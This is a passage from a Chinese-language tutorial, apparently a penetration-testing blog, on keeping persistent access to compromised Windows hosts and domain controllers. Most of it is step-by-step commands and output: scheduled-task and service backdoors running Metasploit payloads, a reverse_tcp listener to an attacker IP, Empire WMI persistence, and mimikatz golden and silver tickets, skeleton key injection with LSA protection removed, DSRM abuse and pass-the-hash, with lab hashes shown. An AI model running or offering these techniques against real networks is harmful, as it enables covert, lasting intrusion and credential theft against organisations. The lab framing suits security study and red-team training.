<p>3.接着在目标主机的shell中使用at命令创建计划任务，让目标主机在指定的时间运行metasploit木马程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</span><br></pre></td></tr></table></figure>

<p>目标主机将在每个工作日的15:01:00执行后门程序，我们便可以在这个时间获得目标机器的控制权：</p>
<h3 id="（2）利用-schtasks-命令"><a href="#（2）利用-schtasks-命令" class="headerlink" title="（2）利用 schtasks 命令"></a>（2）利用 schtasks 命令</h3><p>上面我们讲了用at命令创建计划任务，但是该命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，代替他的是schtasks命命令。schtasks命令比at命令更为灵活、自由。下面来演示schtasks命令的使用，于是，攻击者开始使用schtasks命令来代替at命令。</p>
<p>利用schtasks创建后门的大致流程如下：</p>
<p>1.首先在目标主机上传metasploit生成的后门程序。</p>
<p>2.然后在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的backdoor.exe，启动权限为system。命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\backdoor.exe /ru system /f</span><br></pre></td></tr></table></figure>

<p>然后新开一个metasploit监听，等待一分钟后这个监听便收到了目标主机的session，并且这个session还是system权限的。</p>
<h3 id="（3）利用SharPersist工具"><a href="#（3）利用SharPersist工具" class="headerlink" title="（3）利用SharPersist工具"></a>（3）利用SharPersist工具</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></p>
<p>SharPersist的创建是为了帮助使用多种不同的技术在Windows操作系统上建立持久性。它是一个国外安全人员用C#编写的命令行工具，可以反射性的加载Cobalt Strike的“execute-assembly”命令或任何其他支持反射性加载.NET程序集的框架。SharPersist采用模块化设计，以便将来添加新的持久性技术。还有一些与tradecraft相关的项已经内置到该工具及其支持的持久性技术中，例如file time stomping策略和最小化或隐藏运行应用程序。</p>
<p>该工具支持的持久性技术有：</p>
<ul>
<li><code>keepass</code>-keepass配置文件后门</li>
<li><code>reg</code>-注册表项添加&#x2F;修改</li>
<li><code>schtaskbackdoor</code>-通过向后门计划任务添加其他操作来完成该任务</li>
<li><code>startupfolder</code>-启动文件夹中的lnk文件</li>
<li><code>tortoisesvn</code>-乌龟svn钩子脚本</li>
<li><code>service</code>-创建新的Windows服务</li>
<li><code>schtask</code>-创建新的计划任务</li>
</ul>
<p>如果用户具有管理员级别的特权，则可以通过SharPersist工具创建一个新的计划任务，该任务将在Windows登录期间执行我们上传好的有效载荷。</p>
<p>1.在目标主机上传我们新生成的metasploit木马和SharPersist程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor2.exe C:\\users\\Yb\\backdoor2.exe</span><br><span class="line">upload /tmp/SharPersist.exe C:\\users\\Yb\\desktop</span><br></pre></td></tr></table></figure>

<p>2.然后使用以下命令创建我们恶意的计划任务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t schtask -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Yb\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add -o logon</span><br></pre></td></tr></table></figure>

<p>然后新开一个metasploit监听，等待目标主机重启后便可以收到目标主机的session，并且还是system权限</p>
<p>（本工具有 .NET Framework 版本要求）</p>
<h3 id="（4）Empire-下的利用"><a href="#（4）Empire-下的利用" class="headerlink" title="（4）Empire 下的利用"></a>（4）Empire 下的利用</h3><p>Windows计划任务后门我们可以用Empire上的persistence&#x2F;elevated&#x2F;schtasks后渗透模块在目标主机上进行设置。</p>
<p>设置方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/persistence/elevated/schtasks</span><br><span class="line">set Listener &lt;监听名&gt;</span><br><span class="line">set Agent &lt;Agent&gt;</span><br><span class="line">set DailyTime 19:50</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>（报错<code>[!] Error: module needs to run in an elevated context.</code>）</p>
<p>如果成功在目标主机上设置计划任务后门，将每天19:50执行基于PowerShell的有效负载，并反弹一个高权限的session</p>
<h2 id="Windows-服务后门"><a href="#Windows-服务后门" class="headerlink" title="Windows 服务后门"></a>Windows 服务后门</h2><p>在Windows主机上，获得了管理员的权限后，我们可以通过创建服务并将服务设置自启动的方式，来对目标主机进行持久控制。</p>
<p>如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。</p>
<h3 id="利用sc命令手动创建"><a href="#利用sc命令手动创建" class="headerlink" title="利用sc命令手动创建"></a>利用sc命令手动创建</h3><p>1.首先在目标主机上传新生成的msf木马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor.exe C:\\users\\Yb\\</span><br></pre></td></tr></table></figure>

<p>如果帐户具有本地管理员特权，则可直接利用sc命令从目标主机的命令行中创建服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create backdoor binpath= &quot;C:\Users\Yb\backdoor.exe&quot; start= auto // 创建服务后门</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>binpath：</strong>用于执行任意有效负载</li>
<li><strong>auto：</strong>用于确保恶意服务将自动启动。</li>
</ul>
<p>注意，所有选项的每个&#x3D;号之前 一定不要有空格 &#x3D;号后面一定要有空格，否则会错误。</p>
<p>服务创建成功，然后我们可以在攻击机上重新开启一个metasploit监听，等目标机重启时，目标机就会上线，成功得到了目标机的meterpreter，并且还是system权限的</p>
<p>也可以执行“sc start backdoor”命令立即启动该服务。</p>
<p>注意：我们在新开启的metasploit监听中，使用<code>set AutoRunScript migrate -f</code>设置了自动迁移进程，这是因为当一个进程在Windows系统中启动后，必须与服务控制管理器进行通信，如果没有进行通信，服务控制管理器会认为出现了错误，进而终止这个进程，所以如果我们不设置自动迁移进程，这个meterpreter会很快就断掉了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set AutoRunScript migrate  -f</span><br><span class="line">set lhost 192.168.137.136</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="利用SharPersist工具创建"><a href="#利用SharPersist工具创建" class="headerlink" title="利用SharPersist工具创建"></a>利用SharPersist工具创建</h3><p>除了利用上面的sc命令，我们还可以利用SharPersist工具。SharPersist支持在受感染系统中创建新服务的持久性技术，在系统上安装新服务需要本地管理员。</p>
<p>1.在目标主机上传新生成的metasploit木马程序backdoor2.exe和SharPersist.exe程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /tmp/backdoor2.exe C:\\users\\Yb\\backdoor2.exe</span><br><span class="line">upload /tmp/SharPersist.exe C:\\users\\Yb\\desktop</span><br></pre></td></tr></table></figure>

<p>2.使用以下命令添加新服务，该服务将在Windows启动期间执行任意的有效负载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add</span><br></pre></td></tr></table></figure>

<p>我们在攻击机上新开启一个metasploit监听，当目标主机重启时，目标主机便能上线，如果成功得到目标机的meterpreter，并且还是system权限的</p>
<p>注意：不要忘记迁移进程。<code>set AutoRunScript migrate -f</code></p>
<h3 id="Metasploit下的利用"><a href="#Metasploit下的利用" class="headerlink" title="Metasploit下的利用"></a>Metasploit下的利用</h3><p>Metasploit框架还具有一个后渗透模块：“post&#x2F;windows&#x2F;manage&#x2F;persistence_exe”，该模块需要以下配置，并将可执行文件放置在目标主机的可写位置：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021626587.png" alt="image-20231002162659500"></p>
<p>如上图所示，该模块支持的持久性技术有：</p>
<ol>
<li>注册表运行键后门（USER，即我们前文提到的“run persistence”命令就是用的这个技术）</li>
<li>Windows服务后门（SERVICE）</li>
</ol>
<p>使用该模块创建服务后门时，需要将启动变量修改为SERVICE，以便在系统上安装新服务。以下是创建服务的设置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe </span><br><span class="line">set REXEPATH /tmp/backdoor.exe       // 攻击机本地要上传到目标机的paylaod路径</span><br><span class="line">set SESSION 1 </span><br><span class="line">set STARTUP SERVICE </span><br><span class="line">set LOCALEXEPATH C:\\Users\\Yb     // payload上传到目标机后存放的路径</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>服务后门创建成功，之后的使用方式与前面相同。</p>
<p>除此之外，在metasploit上，我们还可以用metsvc模块创建服务，建立持久后门。metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
<ul>
<li>metsvc.dll</li>
<li>metsvc-service.exe</li>
<li>metsvc.exe</li>
</ul>
<p>并通过服务启动，服务名为meterpreter。</p>
<p>常用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>

<p>我们使用<code>run metsvc –A</code>自动安装后门</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627787.png" alt="image-20231002162721705"></p>
<p>接着我们启用另一个终端并进入msfconsole，使用如下命令即可连接后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set RHOST 192.168.137.135      //目标机ip</span><br><span class="line">set LPORT 31337     //如上图，后门安装过程信息中有</span><br><span class="line">exploit     //获取到的会话是system权限</span><br></pre></td></tr></table></figure>

<p>（没成功）</p>
<h2 id="WMI-型后门"><a href="#WMI-型后门" class="headerlink" title="WMI 型后门"></a>WMI 型后门</h2><p>WMI是微软基于Web的企业管理（WBEM）的实现版本，这是一项行业计划，旨在开发用于访问企业环境中管理信息的标准技术。</p>
<p>WMI型后门通常是由PowerShell编写的，可以直接从新的WMI属性中读取和执行后门代码、给代码加密。通过这种方法，攻击者可以在系统中安装一个具有持久性的后门，且不会在系统磁盘中留下任何文件。</p>
<blockquote>
<p>WMI型后门主要使用了WMI的两个特征，即无文件和无进程。其基本原理是：将代码加密存储在WMI中，达到所谓的“无文件”；当设定的条件被满足时，系统将自动启动PowerShell进程去执行后门程序，执行后，进程将会消失，达到所谓的“无进程”。</p>
</blockquote>
<p>注意：WMI型后门只能由具有管理员权限的用户运行。</p>
<blockquote>
<p>在2015年的Black Hat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。其主要与Powershell命令配合使用可以实现无文件攻击重要方式，具有良好的隐蔽性也是目前较为常用的持久化手段。Black Hat 2015公布了一个WMIBackdoor的poc毕竟还是经典，在流行的powersploit与nishang框架里面也有相关的ps1文件。传送门：<a target="_blank" rel="noopener" href="https://github.com/mattifestation/WMI_Backdoor">https://github.com/mattifestation/WMI_Backdoor</a></p>
</blockquote>
<p>在Empire下有一个叫Invoke-WMI的后渗透模块（persistence&#x2F;elevated&#x2F;wmi），可以创建WMI型后门。</p>
<p>设置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/wmi</span><br><span class="line">set Listener shiyan</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>后门创建成功，如果目标主机重启，那么他就会在启动时重新上线。</p>
<h2 id="域控制器权限维持常见思路"><a href="#域控制器权限维持常见思路" class="headerlink" title="域控制器权限维持常见思路"></a>域控制器权限维持常见思路</h2><p>在我们拿到域控的控制权后，为了我们对域控制器权限的丢失，需要使用权限维持的方法来维持我们取得的权限。下面我们将介绍几种常用的对域控制器现有权限进行持久化的操作，包括黄金票据、白银票据、Skeleton Key万能密码、DSRM 后门、SSP 注入、SID History 后门、等等。</p>
<h3 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a>黄金票据（Golden ticket）</h3><p>在Windows的kerberos认证过程中，Client将自己的信息发送给KDC，然后KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。那么如果获取到了krbtgt的Hash值，不就可以伪造任意的tgt了吗。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p>
<p>Kerberos认证过程：</p>
<ol>
<li>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</li>
<li>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组</li>
<li>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li>
<li>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li>
<li>AP_REQ: Client拿着TGS票据去请求服务</li>
<li>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li>
</ol>
<blockquote>
<p>先假设这么一种情况，原先已拿到的域内所有的账户Hash，包括krbtgt这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
</blockquote>
<p>攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p>
<ul>
<li>需要伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域SID</li>
<li>krbtgt的NTLM Hash</li>
</ul>
<p>测试环境如下所示：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627343.png" alt="image-20231002162744273"></p>
<p>我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，下面我们演示如何用黄金票据建立一个稳固的后门。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域成员主机：Windows 7（192.168.183.131）</span><br><span class="line">域名：DEMO.com</span><br><span class="line">用户名：douser</span><br><span class="line"></span><br><span class="line">域控制器：192.168.183.130</span><br><span class="line">域名：DEMO.com </span><br><span class="line">用户名：administrator</span><br></pre></td></tr></table></figure>

<p>首先，我们登上域控制器，上传mimikatz，然后执行如下命令抓取krbtgt用户的Hash值并获取域sid：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628046.png" alt="image-20231002162800861"></p>
<p>如上图所示，我们得到krbtgt用户的Hash为：7c4ed692473d4b4344c3ba01c5e6cb63，域sid为S-1-5-21-979886063-1111900045-1414766810</p>
<p>然后，我们切换到普通域用户的机器Windows 7，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为域管理员用户（administrator）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628610.png" alt="image-20231002162821391"></p>
<p>生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后使用mimikatz将凭证ticket.kirbi注入进去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   //先清空所有票据</span><br><span class="line">kerberos::ptt ticket.kirbi    //再将生成的票据注入域用户主机Windows7中</span><br><span class="line">// kerberos::ptt &lt;票据文件&gt;   </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628253.png" alt="image-20231002162834188"></p>
<p>此时查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628160.png" alt="image-20231002162845006"></p>
<p>到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用Windows 7任意访问域控制器了，可以使用net use进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629540.png" alt="image-20231002162900337"></p>
<p>也可以使用psexec，wmi等方法通过Windows7对DC进行远程执行命令了，具体操作不再演示。</p>
<h3 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a>白银票据（Silver ticket）</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p>
<p><strong>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</strong></p>
<p>攻击者要利用白银票据进行票据传递攻击，需要掌握下面几个信息：</p>
<ul>
<li>域名</li>
<li>域SID</li>
<li>目标服务器的FQDN</li>
<li>可利用的服务</li>
<li>服务账号的NTLM Hash</li>
<li>要伪造的用户名</li>
</ul>
<p>如下，我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，将使用白银票据伪造CIFS服务权限，对DC进行持久化控制。CIFS服务通常用于Windows主机之间的文件共享。</p>
<p>测试环境与黄金票据的相同：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629777.png" alt="image-20231002162915711"></p>
<p>首先，登录域控，抓取机器账号的Hash：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629447.png" alt="image-20231002162927301"></p>
<p>得到域控制器上的计算机账号的Hash为：f0954d00b21d338aa86051eca90f7f74</p>
<p>（注意是WIN-ENS2VR5TR3N$用户的NTLM-Hash，不是Administrator用户，因为要利用共享服务账号）</p>
<p>然后切换到普通域用户机器Windows 7中，使用mimikatz生成伪造的白银票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 /target:WIN-ENS2VR5TR3N.DEMO.com /rc4:f0954d00b21d338aa86051eca90f7f74 /service:cifs /user:douser /ptt</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;sid：域的SID值</li>
<li>&#x2F;rc4：server机器的hash</li>
<li>&#x2F;service：可利用的服务，这里是cifs</li>
<li>&#x2F;user：要伪造的用户名，任意填写</li>
<li>&#x2F;target：域控制器名，即FQDN（全称，如dc.domain.com）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629574.png" alt="image-20231002162943354"></p>
<p>成功生成了伪造的白银票据，此时进行权限验证。如下，发现已经可以访问域控制器的共享目录了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N.demo.com\c$         // 机器名要全称，注意是全称</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021630411.png" alt="image-20231002163048215"></p>
<h3 id="Skeleton-Key（万能钥匙）"><a href="#Skeleton-Key（万能钥匙）" class="headerlink" title="Skeleton Key（万能钥匙）"></a>Skeleton Key（万能钥匙）</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理就是对 lsass.exe 进行注入，所以重启后会失效。</p>
<p>我们可以使用Skeleton Key(万能密码)，对域内权限进行持久化操作。我们将Skeleton Key安装在域控制器上，便能够能够让所有域用户使用同一个万能密码对域控进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，这里需要注意的是重启将失效。具体操作如下。</p>
<p>控制域控制器后，在域控上传mimikatz，并以管理员权限运行，使用mimikatz注入Skeleton Key：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021631949.png" alt="image-20231002163109791"></p>
<p>如上图所示注入成功，此时便会在域内的所有账号中添加万能密码：“mimikatz”，接下来，我们就可以在域内用任何用户，以密码 “mimikatz” 进行登陆了。如下，我们开启域控的远程桌面，并用密码 “mimikatz” 进行登陆：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632404.png" alt="image-20231002163214300"></p>
<p>如下图，登录成功：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632636.png" alt="image-20231002163229515"></p>
<p><strong>注意：</strong>微软在2014年3月12日添加了LSA保护策略，用来防止对进程lsass.exe的代码注入，这样一来就无法使用mimikatz对lsass.exe进行注入，相关操作也会失败。所以，我们要绕过LSA Protection，幸运的是，mimikatz早在2013年10月就已支持绕过LSA Protection，但是该功能需要mimidrv.sys文件，导入驱动文件mimidrv.sys后，绕过LSA Protection，即可操作成功。相应的skeleton key安装命令也变为了如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br><span class="line">mimikatz # misc::skeleton</span><br></pre></td></tr></table></figure>

<p>使用系统：</p>
<ul>
<li>Windows 8.1</li>
<li>Windows Server 2012 R2</li>
</ul>
<h3 id="DSRM-后门"><a href="#DSRM-后门" class="headerlink" title="DSRM 后门"></a>DSRM 后门</h3><p>DSRM是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账号(也就是DSRM账号)。DSRM的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行 ntdsutil 命令。</p>
<p>在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。我们知道，每个DC都有本地管理员(administrator)账号和密码（与域管理员账号密码不同）。DSRM账号可以作为每个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p>
<p><strong>注意：该类持久化操作适用的服务器版本：Windows Server 2008及以后版本的Windows服务器。</strong></p>
<p><strong>在域控制器上，DSRM账号的表现形式是本地的管理员 Administrator 用户，也就是说本地管理员 Administrator 用户等于DSRM账号。</strong></p>
<p>假设我们已经获得了域内普通域用户Windows7主机和域控制器DC的控制权，下面我们来简单演示一下如何设置DSRM后门。</p>
<p>1.为DSRM设置新密码</p>
<p>在域控制器的cmd中进入ntdsutil，然后输入下面命令进行修改DSRM账户的密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil    // 进入ntdsutil</span><br><span class="line">set dsrm password    // 设置DSRM账户的密码</span><br><span class="line">reset password on server null    // 在当前域控制器上恢复DSRM密码</span><br><span class="line">&lt;password&gt;    // 输入新密码</span><br><span class="line">&lt;password&gt;    // 重新输入新密码</span><br><span class="line">q    //退出DSRM密码设置模式</span><br><span class="line">q    // 退出ntdsutil</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633920.png" alt="image-20231002163312856"></p>
<p>2.接着，我们使用mimikatz来读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633406.png" alt="image-20231002163327316"></p>
<p>如上图所示，本地管理员administrator的NTLM Hash为：d8f69f9520b448174136e49a1051ef07。</p>
<p>3.然后，我们修改目标主机DC的DSRM账户登录方式</p>
<p>在Windows Server 2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。我们可以在注册表的HKLM:\System\CurrentControlSet\Control\Lsa\中新建DsrmAdminLogonBehavior项进行设置，将该新建的项中的值设为0、1、2可以分别设置不同的DSRM账户登录方式：</p>
<ul>
<li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
<li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
<li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li>
</ul>
<p>如下所示，我们用命令将DSRM的登录方式设置为“2”，即在任何情况下，都可以使用DSRM管理员账号登录域控制器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;DsrmAdminLogonBehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634460.png" alt="image-20231002163407401"></p>
<p>4.最后，我们即可以在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:OWA /user:Administrator /ntlm:d8f69f9520b448174136e49a1051ef07</span><br></pre></td></tr></table></figure>

<p><strong>注意，在这里，&#x2F;domain选项不是添域名，而是域控制器的机器名（OWA），一定要注意。</strong></p>
<p>如下图所示，命令执行完后，会在Windows7上自动打开一个新的cmd窗口，在该窗口中我们不用提供明文密码便可以对域控制器进行远程访问或控制了。如下，我们列出了域控制器的c盘目录：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634947.png" alt="image-20231002163419870"></p>
